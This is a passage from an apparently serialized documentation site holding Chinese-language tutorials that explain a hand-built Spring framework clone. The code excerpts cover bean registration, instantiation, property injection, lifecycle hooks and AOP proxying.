beandefinition.setdestroymethodname(destroymethodname);\n            if (strutil.isnotempty(beanscope)) {\n                beandefinition.setscope(beanscope);\n            }\n            list<element> propertylist = bean.elements("property");\n            // 读取属性并填充\n            for (element property : propertylist) {\n                // 解析标签：property\n                string attrname = property.attributevalue("name");\n                string attrvalue = property.attributevalue("value");\n                string attrref = property.attributevalue("ref");\n                // 获取属性值：引入对象、值对象\n                object value = strutil.isnotempty(attrref) ? new beanreference(attrref) : attrvalue;\n                // 创建属性信息\n                propertyvalue propertyvalue = new propertyvalue(attrname, value);\n                beandefinition.getpropertyvalues().addpropertyvalue(propertyvalue);\n            }\n            if (getregistry().containsbeandefinition(beanname)) {\n                throw new beansexception("duplicate beanname[" + beanname + "] is not allowed");\n            }\n            // 注册 beandefinition\n            getregistry().registerbeandefinition(beanname, beandefinition);\n        }\n    }\n\n    private void scanpackage(string scanpath) {\n        string[] basepackages = strutil.splittoarray(scanpath, \',\');\n        classpathbeandefinitionscanner scanner = new classpathbeandefinitionscanner(getregistry());\n        scanner.doscan(basepackages);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\n根据提供路径封装为 beandefinition 并注册到 beanfactory\n\n    public void doscan(string... basepackages) {\n        for (string basepackage : basepackages) {\n            set<beandefinition> candidates = findcandidatecomponents(basepackage);\n            for (beandefinition beandefinition : candidates) {\n                // 解析 bean 的作用域 singleton、prototype\n                string beanscope = resolvebeanscope(beandefinition);\n                if (strutil.isnotempty(beanscope)) {\n                    beandefinition.setscope(beanscope);\n                }\n                registry.registerbeandefinition(determinebeanname(beandefinition), beandefinition);\n            }\n        }\n\n        // 注册处理注解的 beanpostprocessor(@autowired、@value)\n        registry.registerbeandefinition("cn.bugstack.springframework.context.annotation.internalautowiredannotationprocessor", new beandefinition(autowiredannotationbeanpostprocessor.class));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n对提供的包路径扫描有 @component 注解的类\n\n    public set<beandefinition> findcandidatecomponents(string basepackage) {\n        set<beandefinition> candidates = new linkedhashset<>();\n        set<class<?>> classes = classutil.scanpackagebyannotation(basepackage, component.class);\n        for (class<?> clazz : classes) {\n            candidates.add(new beandefinition(clazz));\n        }\n        return candidates;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# beanfactorypostprocessor\n\nbeanfactorypostprocessor 可以修改我们对 beandefinition 定义的所有信息，可以添加属性，修改属性，添加额外的方法等。具体会对所有实现 beanfactorypostprocessor 的类进行获取，并循环调用 postprocessbeanfactory 方法\n\n    private void invokebeanfactorypostprocessors(configurablelistablebeanfactory beanfactory) {\n        map<string, beanfactorypostprocessor> beanfactorypostprocessormap = beanfactory.getbeansoftype(beanfactorypostprocessor.class);\n        for (beanfactorypostprocessor beanfactorypostprocessor : beanfactorypostprocessormap.values()) {\n            beanfactorypostprocessor.postprocessbeanfactory(beanfactory);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n提供一个默认的实现\n\n    @override\n    public void postprocessbeanfactory(configurablelistablebeanfactory beanfactory) throws beansexception {\n        try {\n            // 加载属性文件\n            defaultresourceloader resourceloader = new defaultresourceloader();\n            resource resource = resourceloader.getresource(location);\n\n            // 把属性文件的内容加载到properties里组成键值对\n            properties properties = new properties();\n            properties.load(resource.getinputstream());\n            string[] beandefinitionnames = beanfactory.getbeandefinitionnames();\n            for (string beanname : beandefinitionnames) {\n                beandefinition beandefinition = beanfactory.getbeandefinition(beanname);\n                propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n                for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                    object value = propertyvalue.getvalue();\n                    if (!(value instanceof string)) continue;\n                    value = resolveplaceholder((string) value, properties);\n                    propertyvalues.addpropertyvalue(new propertyvalue(propertyvalue.getname(), value));\n                }\n            }\n            // 向容器中添加字符串解析器，供解析@value注解使用\n            stringvalueresolver valueresolver = new placeholderresolvingstringvalueresolver(properties);\n            // 注册到容器，以便后续使用\n            beanfactory.addembeddedvalueresolver(valueresolver);\n        } catch (ioexception e) {\n            throw new beansexception("could not load properties", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 注册实现 beanpostprocessor 的类\n\nbeanpostprocessor 就是提供了 postprocessbeforeinitialization，postprocessafterinitialization 两种方法，提供我们在实例化 bean 的时候，所有实现 beanpostprocessor 的类，注册到 list<beanpostprocessor> beanpostprocessors = new arraylist<beanpostprocessor>(); 中\n\n    private void registerbeanpostprocessors(configurablelistablebeanfactory beanfactory) {\n        map<string, beanpostprocessor> beanpostprocessormap = beanfactory.getbeansoftype(beanpostprocessor.class);\n        for (beanpostprocessor beanpostprocessor : beanpostprocessormap.values()) {\n            beanfactory.addbeanpostprocessor(beanpostprocessor);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 实例化 bean\n\n    protected <t> t dogetbean(final string name, final object[] args) {\n        // 从缓存中获取实例\n        object sharedinstance = getsingleton(name);\n        if (sharedinstance != null) {\n            // 如果实现了 factorybean，则需要调用 factorybean##getobject\n            return (t) getobjectforbeaninstance(sharedinstance, name);\n        }\n        // 从beandefinition列表中获取对象\n        beandefinition beandefinition = getbeandefinition(name);\n        object bean = createbean(name, beandefinition, args);\n        // 如果实现了 factorybean，则需要调用 factorybean##getobject\n        return (t) getobjectforbeaninstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n实例化 bean 的具体方法\n\n    protected object docreatebean(string beanname, beandefinition beandefinition, object[] args) {\n        object bean = null;\n        try {\n            // 实例化 bean\n            bean = createbeaninstance(beandefinition, beanname, args);\n            // 处理循环依赖，将实例化后的bean对象提前放入缓存中暴露出来\n            if (beandefinition.issingleton()) {\n                object finalbean = bean;\n                addsingletonfactory(beanname, () -> getearlybeanreference(beanname, beandefinition, finalbean));\n            }\n            // 是否需要继续进行后续的属性填充\n            boolean continuewithpropertypopulation = applybeanpostprocessorsafterinstantiation(beanname, bean);\n            if (!continuewithpropertypopulation) {\n                return bean;\n            }\n            // 在设置 bean 属性之前，允许 beanpostprocessor 修改属性值（注解属性填充）\n            applybeanpostprocessorsbeforeapplyingpropertyvalues(beanname, bean, beandefinition);\n            // 给 bean 填充属性（xml属性填充）\n            applypropertyvalues(beanname, bean, beandefinition);\n            // 执行 bean 的初始化方法和 beanpostprocessor 的前置和后置处理方法\n            bean = initializebean(beanname, bean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception("instantiation of bean failed", e);\n        }\n        // 注册实现了 disposablebean 接口的 bean 对象\n        registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n        // 判断 scope_singleton、scope_prototype\n        object exposedobject = bean;\n        if (beandefinition.issingleton()) {\n            // 获取代理对象\n            exposedobject = getsingleton(beanname);\n            registersingleton(beanname, exposedobject);\n        }\n        return exposedobject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\ncreatebeaninstance 使用了 cglib 来实例化一个 bean, 也可以使用 java 自带的反射\n\n    protected object createbeaninstance(beandefinition beandefinition, string beanname, object[] args) {\n        constructor constructortouse = null;\n        class<?> beanclass = beandefinition.getbeanclass();\n        constructor<?>[] declaredconstructors = beanclass.getdeclaredconstructors();\n        for (constructor ctor : declaredconstructors) {\n            if (null != args && ctor.getparametertypes().length == args.length) {\n                constructortouse = ctor;\n                break;\n            }\n        }\n        return getinstantiationstrategy().instantiate(beandefinition, beanname, constructortouse, args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\ncglib 实现实例化\n\n@override\n    public object instantiate(beandefinition beandefinition, string beanname, constructor ctor, object[] args) throws beansexception {\n        enhancer enhancer = new enhancer();\n        enhancer.setsuperclass(beandefinition.getbeanclass());\n        enhancer.setcallback(new noop() {\n            @override\n            public int hashcode() {\n                return super.hashcode();\n            }\n        });\n        if (null == ctor) return enhancer.create();\n        return enhancer.create(ctor.getparametertypes(), args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\njava 反射实现序列化\n\n    @override\n    public object instantiate(beandefinition beandefinition, string beanname, constructor ctor, object[] args) throws beansexception {\n        class clazz = beandefinition.getbeanclass();\n        try {\n            if (null != ctor) {\n                return clazz.getdeclaredconstructor(ctor.getparametertypes()).newinstance(args);\n            } else {\n                return clazz.getdeclaredconstructor().newinstance();\n            }\n        } catch (nosuchmethodexception | instantiationexception | illegalaccessexception | invocationtargetexception e) {\n            throw new beansexception("failed to instantiate [" + clazz.getname() + "]", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 注解属性填充\n\n注解属性，会从之前注册的 beanpostprocessor 里匹配 instantiationawarebeanpostprocessor 的对象，其中默认的 autowiredannotationbeanpostprocessor 具体实现了该类\n\n    protected void applybeanpostprocessorsbeforeapplyingpropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n        for (beanpostprocessor beanpostprocessor : getbeanpostprocessors()) {\n            if (beanpostprocessor instanceof instantiationawarebeanpostprocessor) {\n                propertyvalues pvs = ((instantiationawarebeanpostprocessor) beanpostprocessor).postprocesspropertyvalues(beandefinition.getpropertyvalues(), bean, beanname);\n                if (null != pvs) {\n                    for (propertyvalue propertyvalue : pvs.getpropertyvalues()) {\n                        beandefinition.getpropertyvalues().addpropertyvalue(propertyvalue);\n                    }\n                }\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nautowiredannotationbeanpostprocessor 感知注解属性填充\n\n    @override\n    public propertyvalues postprocesspropertyvalues(propertyvalues pvs, object bean, string beanname) throws beansexception {\n        class<?> clazz = bean.getclass();\n        clazz = classutils.iscglibproxyclass(clazz) ? clazz.getsuperclass() : clazz;\n        // 获得对象所有字段\n        field[] declaredfields = clazz.getdeclaredfields();\n        for (field field : declaredfields) {\n            // @value 注解\n            value valueannotation = field.getannotation(value.class);\n            if (null != valueannotation) {\n                object value = valueannotation.value();\n                // 解析得到值\n                value = beanfactory.resolveembeddedvalue((string) value);\n                // 类型转换\n                class<?> sourcetype = value.getclass();\n                class<?> targettype = (class<?>) typeutil.gettype(field);\n                // 对值进行转换处理\n                conversionservice conversionservice = beanfactory.getconversionservice();\n                if (conversionservice != null) {\n                    if (conversionservice.canconvert(sourcetype, targettype)) {\n                        value = conversionservice.convert(value, targettype);\n                    }\n                }\n                // 把值设置进去\n                beanutil.setfieldvalue(bean, field.getname(), value);\n            }\n        }\n        // 2. 处理注解 @autowired\n        for (field field : declaredfields) {\n            autowired autowiredannotation = field.getannotation(autowired.class);\n            if (null != autowiredannotation) {\n                class<?> fieldtype = field.gettype();\n                string dependentbeanname = null;\n                qualifier qualifierannotation = field.getannotation(qualifier.class);\n                object dependentbean = null;\n                if (null != qualifierannotation) {\n                    dependentbeanname = qualifierannotation.value();\n                    dependentbean = beanfactory.getbean(dependentbeanname, fieldtype);\n                } else {\n                    dependentbean = beanfactory.getbean(fieldtype);\n                }\n                beanutil.setfieldvalue(bean, field.getname(), dependentbean);\n            }\n        }\n        return pvs;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# xml 属性填充\n\nxml 属性填充这里说过会出现循环依赖的问题，在实例化阶段的前后已经对这个处理了，后续会单独讲解\n\n    protected void applypropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n        try {\n            propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n            for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                string name = propertyvalue.getname();\n                object value = propertyvalue.getvalue();\n                if (value instanceof beanreference) {\n                    // a 依赖 b，获取 b 的实例化\n                    beanreference beanreference = (beanreference) value;\n                    value = getbean(beanreference.getbeanname());\n                }\n                // 类型转换\n                else {\n                    class<?> sourcetype = value.getclass();\n                    class<?> targettype = (class<?>) typeutil.getfieldtype(bean.getclass(), name);\n                    conversionservice conversionservice = getconversionservice();\n                    if (conversionservice != null) {\n                        if (conversionservice.canconvert(sourcetype, targettype)) {\n                            value = conversionservice.convert(value, targettype);\n                        }\n                    }\n                }\n                // 反射设置属性填充\n                 beanutil.setfieldvalue(bean, name, value);\n            }\n        } catch (exception e) {\n            throw new beansexception("error setting property values：" + beanname + " message：" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 感知对象\n\n感知对象做为一个扩展接口，只要我们的 bean 实现了这些接口，就可以为我们的 bean 提供额外的能力\n\n    private object initializebean(string beanname, object bean, beandefinition beandefinition) {\n        // invokeawaremethods（感知对象）\n        if (bean instanceof aware) {\n            if (bean instanceof beanfactoryaware) {\n                ((beanfactoryaware) bean).setbeanfactory(this);\n            }\n            if (bean instanceof beanclassloaderaware) {\n                ((beanclassloaderaware) bean).setbeanclassloader(getbeanclassloader());\n            }\n            if (bean instanceof beannameaware) {\n                ((beannameaware) bean).setbeanname(beanname);\n            }\n        }\n        // 1. 执行 beanpostprocessor before 处理\n        object wrappedbean = applybeanpostprocessorsbeforeinitialization(bean, beanname);\n        // 执行 bean 对象的初始化方法\n        try {\n            invokeinitmethods(beanname, wrappedbean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception("invocation of init method of bean[" + beanname + "] failed", e);\n        }\n        // 2. 执行 beanpostprocessor after 处理\n        wrappedbean = applybeanpostprocessorsafterinitialization(wrappedbean, beanname);\n        return wrappedbean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 初始化方法之前\n\n在 bean 的初始化方法之前调用，默认提供了 applicationcontext 的上下文注入，当某个类实现了 applicationcontextaware，就提供 applicationcontext 上下文的能力，只是我们要实现的是 applicationcontextaware ，并不是 beanpostprocessor\n\n    @override\n    public object applybeanpostprocessorsbeforeinitialization(object existingbean, string beanname) throws beansexception {\n        object result = existingbean;\n        for (beanpostprocessor processor : getbeanpostprocessors()) {\n            object current = processor.postprocessbeforeinitialization(result, beanname);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n    @override\n    public object postprocessbeforeinitialization(object bean, string beanname) throws beansexception {\n        if (bean instanceof applicationcontextaware){\n            ((applicationcontextaware) bean).setapplicationcontext(applicationcontext);\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# bean 的初始化方法\n\nbean 初始化方法还是比较简单的，主要是通过判断是否实现 initializingbean 接口，如果实现了，则调用实例化对象实现的 afterpropertiesset 方法。如果不是以接口实现的，是以 xml 描述的，则是通过反射的方式调用该方法。\n\n    private void invokeinitmethods(string beanname, object bean, beandefinition beandefinition) throws exception {\n        // 1. 实现接口 initializingbean\n        if (bean instanceof initializingbean) {\n            ((initializingbean) bean).afterpropertiesset();\n        }\n\n        // 2. 注解配置 init-method {判断是为了避免二次执行销毁}\n        string initmethodname = beandefinition.getinitmethodname();\n        if (strutil.isnotempty(initmethodname)) {\n            method initmethod = beandefinition.getbeanclass().getmethod(initmethodname);\n            if (null == initmethod) {\n                throw new beansexception("could not find an init method named \'" + initmethodname + "\' on bean with name \'" + beanname + "\'");\n            }\n            initmethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n<bean id="userdao" class="cn.bugstack.springframework.test.bean.userdao" init-method="initdatamethod" destroy-method="destroydatamethod"/>\n\n\n1\n\n\n\n# 初始化方法之后\n\n    @override\n    public object applybeanpostprocessorsafterinitialization(object existingbean, string beanname) throws beansexception {\n        object result = existingbean;\n        for (beanpostprocessor processor : getbeanpostprocessors()) {\n            object current = processor.postprocessafterinitialization(result, beanname);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 注册销毁事件\n\n销毁事件需要 bean 实现 disposablebean 接口并重写 destroy () 方法。如下先是把实现 disposablebean 或有在 xml 描述过销毁方法的注册到一个容器里。\n\n    protected void registerdisposablebeanifnecessary(string beanname, object bean, beandefinition beandefinition) {\n        // 非 singleton 类型的 bean 不执行销毁方法\n        if (!beandefinition.issingleton()) return;\n        if (bean instanceof disposablebean || strutil.isnotempty(beandefinition.getdestroymethodname())) {\n            registerdisposablebean(beanname, new disposablebeanadapter(bean, beanname, beandefinition));\n        }\n    }\n\n    public void registerdisposablebean(string beanname, disposablebean bean) {\n        disposablebeans.put(beanname, bean);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n然后再整个启动过程结束调用 registershutdownhook 方法添加一个钩子监听。\n\n    @override\n    public void registershutdownhook() {\n        // java 中的一个方法，它用于注册 jvm 关闭时要执行的特定代码块。当 jvm 即将关闭时，这些代码块会被执行，以便进行清理、释放资源等操作。\n        // 这些代码块通常称为“钩子（hook）”，因此该方法也被称为“添加关闭钩子（add shutdown hook）”。\n        runtime.getruntime().addshutdownhook(new thread(this::close));\n    }\n\n    @override\n    public void close() {\n        // 发布容器关闭事件\n        publishevent(new contextclosedevent(this));\n        // 执行销毁单例bean的销毁方法\n        getbeanfactory().destroysingletons();\n    }\n\n    public void destroysingletons() {\n        set<string> keyset = this.disposablebeans.keyset();\n        object[] disposablebeannames = keyset.toarray();\n\n        for (int i = disposablebeannames.length - 1; i >= 0; i--) {\n            object beanname = disposablebeannames[i];\n            disposablebean disposablebean = disposablebeans.remove(beanname);\n            try {\n                disposablebean.destroy();\n            } catch (exception e) {\n                throw new beansexception("destroy method on bean with name \'" + beanname + "\' threw an exception", e);\n            }\n        }\n    }\n\n    @override\n    public void destroy() throws exception {\n        // 1. 实现接口 disposablebean\n        if (bean instanceof disposablebean) {\n            ((disposablebean) bean).destroy();\n        }\n        // 2. 注解配置 destroy-method {判断是为了避免二次执行销毁}\n        if (strutil.isnotempty(destroymethodname) && !(bean instanceof disposablebean && "destroy".equals(this.destroymethodname))) {\n            method destroymethod = bean.getclass().getmethod(destroymethodname);\n            if (null == destroymethod) {\n                throw new beansexception("couldn\'t find a destroy method named \'" + destroymethodname + "\' on bean with name \'" + beanname + "\'");\n            }\n            destroymethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# scop 处理单例\n\n    public void registersingleton(string beanname, object singletonobject) {\n        // 三级缓存\n        singletonobjects.put(beanname, singletonobject);\n        // 二级缓存\n        earlysingletonobjects.remove(beanname);\n        // 一级缓存\n        singletonfactories.remove(beanname);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',charsets:{cjk:!0}},{title:"核心内容拆解 AOP",frontmatter:{title:"核心内容拆解 AOP",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/201/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/01.spring/201.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20AOP.html",relativePath:"01.框架/01.Spring/01.spring/201.核心内容拆解 AOP.md",key:"v-5cc7fa15",path:"/spring/spring/201/",headers:[{level:2,title:"AOP",slug:"aop",normalizedTitle:"aop",charIndex:2},{level:3,title:"封装",slug:"封装",normalizedTitle:"封装",charIndex:2882},{level:3,title:"把封装的融入到 Spring 中",slug:"把封装的融入到-spring-中",normalizedTitle:"把封装的融入到 spring 中",charIndex:5234}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"AOP 封装 把封装的融入到 Spring 中",content:'# AOP\n\nAOP 的诞生可以追溯到上世纪 90 年代初期，它最早由 Gregor Kiczales 等人提出，并在 1997 年发表了经典的论文 Aspect-Oriented Programming。后来，AspectJ 成为了 Java 生态中使用最广泛的 AOP 框架之一。\n\nAOP 的目的是为了解决在 OOP（面向对象编程）中难以处理的横切关注点问题，即将系统业务逻辑代码与其他非业务功能（如日志记录、性能统计、安全控制等）分离开来。AOP 通过把这些非业务功能独立出来，在需要时动态地植入到系统中，从而实现对业务逻辑的无侵入式增强。\n\nAOP 的核心在于其能够将业务逻辑与非业务功能分离开来，从而降低了代码的耦合度，并且支持在运行时动态地植入和移除切面。这样一来，就可以实现更加灵活、可维护和可扩展的系统。\n\nAOP 的具体表现包括切面（Aspect）、连接点（Join Point）、通知（Advice）、切点（Pointcut）和引入（Introduction）等概念。其中，切面是指横跨多个对象的通用功能，连接点是程序执行过程中能够插入切面的点，通知则是定义了切面在连接点处所执行的操作，切点则是一个谓词表达式，用于匹配连接点，引入则是为某个对象添加新的接口实现。具体如下代码：\n\n    public void test_proxy_method() {\n        // 目标对象(可以替换成任何的目标对象)\n        Object targetObj = new UserService();\n        // AOP 代理\n        IUserService proxy = (IUserService) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), targetObj.getClass().getInterfaces(), new InvocationHandler() {\n            // 方法匹配器\n            MethodMatcher methodMatcher = new AspectJExpressionPointcut("execution(* cn.bugstack.springframework.test.bean.IUserService.*(..))");\n            @Override\n            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                if (methodMatcher.matches(method, targetObj.getClass())) {\n                    // 方法拦截器\n                    MethodInterceptor methodInterceptor = invocation -> {\n                        long start = System.currentTimeMillis();\n                        try {\n                            return invocation.proceed();\n                        } finally {\n                            System.out.println("监控 - Begin By AOP");\n                            System.out.println("方法名称：" + invocation.getMethod().getName());\n                            System.out.println("方法耗时：" + (System.currentTimeMillis() - start) + "ms");\n                            System.out.println("监控 - End\\r\\n");\n                        }\n                    };\n                    // 反射调用\n                    return methodInterceptor.invoke(new ReflectiveMethodInvocation(targetObj, method, args));\n                }\n                return method.invoke(targetObj, args);\n            }\n        });\n        String result = proxy.queryUserInfo();\n        System.out.println("测试结果：" + result);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n这段代码使用了 JDK 动态代理实现 AOP 的功能，没有使用 Spring 提供的方法、类和注解等。\n\n * 连接点：连接点是在目标对象上匹配的特定点，这里的连接点是 IUserService 接口中的所有方法，由于使用了 targetObj.getClass ().getInterfaces () 获取目标对象所实现的接口，因此只拦截了 IUserService 接口中的方法。\n * 切面：切面是一个模块化的横切关注点，在这里我们可以视为没有显式定义的切面。而是直接在 InvocationHandler.invoke () 中实现了拦截和增强逻辑，包括方法匹配器、方法拦截器和反射调用等。\n * 切点：切点是一种谓词表达式，用于匹配连接点。这里使用了 AspectJ 表达式 "execution (* cn.bugstack.springframework.test.bean.IUserService.*(..))"，它匹配了 IUserService 接口中的所有方法。\n * 通知：通知类型包括前置通知、后置通知、环绕通知、抛出通知和最终通知。在这里使用了环绕通知，即在方法执行之前和之后添加了监控逻辑。\n * 引入：引介通常是一个特殊的通知类型，它允许在运行时为类动态地添加新接口实现。这里没有使用引介。\n\n\n# 封装\n\n在 Spring 中，核心逻辑是离不开上面的代理例子的，只是相对应做了些封装，我们先用类图来简单说明下封装关系：\n\n\n\n用测试例子来说明每步的核心\n\n    /**\n     * 切点表达式，来验证切点\n     * @throws NoSuchMethodException\n     */\n    @Test\n    public void test_aop() throws NoSuchMethodException {\n        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut("execution(* cn.bugstack.springframework.test.bean.UserService.*(..))");\n        Class<UserService> clazz = UserService.class;\n        Method method = clazz.getDeclaredMethod("queryUserInfo");\n        System.out.println("切点是否包含该类：" + pointcut.matches(clazz));\n        System.out.println("切点是否包含该类该方法：" + pointcut.matches(method, clazz));\n    }\n\n    /**\n     * 切面 和 动态代理\n     */\n    @Test\n    public void test_dynamic() {\n        // 目标对象\n        IUserService userService = new UserService();\n        // 组装代理信息，切面\n        AdvisedSupport advisedSupport = new AdvisedSupport();\n        // 设置代理目标对象\n        advisedSupport.setTargetSource(new TargetSource(userService));\n        // 设置拦截器\n        advisedSupport.setMethodInterceptor(new UserServiceInterceptor());\n        // 匹配代理对象\n        advisedSupport.setMethodMatcher(new AspectJExpressionPointcut("execution(* cn.bugstack.springframework.test.bean.IUserService.*(..))"));\n        // 代理对象(JdkDynamicAopProxy)\n        IUserService proxy_jdk = (IUserService) new JdkDynamicAopProxy(advisedSupport).getProxy();\n        // 测试调用\n        System.out.println("测试结果：" + proxy_jdk.queryUserInfo());\n        // 代理对象(Cglib2AopProxy)\n        IUserService proxy_cglib = (IUserService) new Cglib2AopProxy(advisedSupport).getProxy();\n        // 测试调用\n        System.out.println("测试结果：" + proxy_cglib.register("花花"));\n    }\n\npublic class UserServiceInterceptor implements MethodInterceptor {\n    @Override\n    public Object invoke(MethodInvocation invocation) throws Throwable {\n        long start = System.currentTimeMillis();\n        try {\n            return invocation.proceed();\n        } finally {\n            System.out.println("监控 - Begin By AOP");\n            System.out.println("方法名称：" + invocation.getMethod());\n            System.out.println("方法耗时：" + (System.currentTimeMillis() - start) + "ms");\n            System.out.println("监控 - End\\r\\n");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# 把封装的融入到 Spring 中\n\n右侧部分就是描述了整个融合到 Spring 中的类，会在 Bean 创建的过程中 初始化方法之后 这个生命周期内先找到是否提供了 DefaultAdvisorAutoProxyCreator 类的支持，因为他描述了具体代理类的过程。\n\n> 为什么会在初始化方法之后才进行代理，是因为代理类也需要的属性也需要被填充，所以等填充完毕后在代理\n\n\n\n核心方法，描述了整个类被代理的过程\n\n    protected Object wrapIfNecessary(Object bean, String beanName) {\n        // 判断Bean是否是Advice，Pointcut，Advisor的子类或者两类相同可以相互转（类层面），用户定义的类都是 false\n        if (isInfrastructureClass(bean.getClass())) return bean;\n        // 得到注册的AspectJExpressionPointcutAdvisor\n        Collection<AspectJExpressionPointcutAdvisor> advisors = beanFactory.getBeansOfType(AspectJExpressionPointcutAdvisor.class).values();\n        for (AspectJExpressionPointcutAdvisor advisor : advisors) {\n            ClassFilter classFilter = advisor.getPointcut().getClassFilter();\n            // 用表达式 过滤匹配类\n            if (!classFilter.matches(bean.getClass())) continue;\n            // 封装\n            AdvisedSupport advisedSupport = new AdvisedSupport();\n            TargetSource targetSource = new TargetSource(bean);\n            advisedSupport.setTargetSource(targetSource);\n            advisedSupport.setMethodInterceptor((MethodInterceptor) advisor.getAdvice());\n            advisedSupport.setMethodMatcher(advisor.getPointcut().getMethodMatcher());\n            advisedSupport.setProxyTargetClass(true);\n            // 返回代理对象\n            return new ProxyFactory(advisedSupport).getProxy();\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n<beans>\n    \x3c!-- 目标类 --\x3e\n    <bean id="userService" class="cn.bugstack.springframework.test.bean.UserService"/>\n    \x3c!-- 代理类 --\x3e\n    <bean id="beforeAdvice" class="cn.bugstack.springframework.test.bean.UserServiceBeforeAdvice"/>\n    \x3c!-- 组件类，至关重要 --\x3e\n    <bean class="cn.bugstack.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator"/>\n    \x3c!-- \n        这里是  advisedSupport.setMethodInterceptor((MethodInterceptor) advisor.getAdvice()); 设置拦截器，\n        可以是前置拦截，后置拦截，或者环绕拦截\n     --\x3e\n    <bean id="methodInterceptor" class="cn.bugstack.springframework.aop.framework.adapter.MethodBeforeAdviceInterceptor">\n        <property name="advice" ref="beforeAdvice"/>\n    </bean>\n    \x3c!-- 切面表达式 --\x3e\n    <bean id="pointcutAdvisor" class="cn.bugstack.springframework.aop.aspectj.AspectJExpressionPointcutAdvisor">\n        <property name="expression" value="execution(* cn.bugstack.springframework.test.bean.IUserService.*(..))"/>\n        <property name="advice" ref="methodInterceptor"/>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',normalizedContent:'# aop\n\naop 的诞生可以追溯到上世纪 90 年代初期，它最早由 gregor kiczales 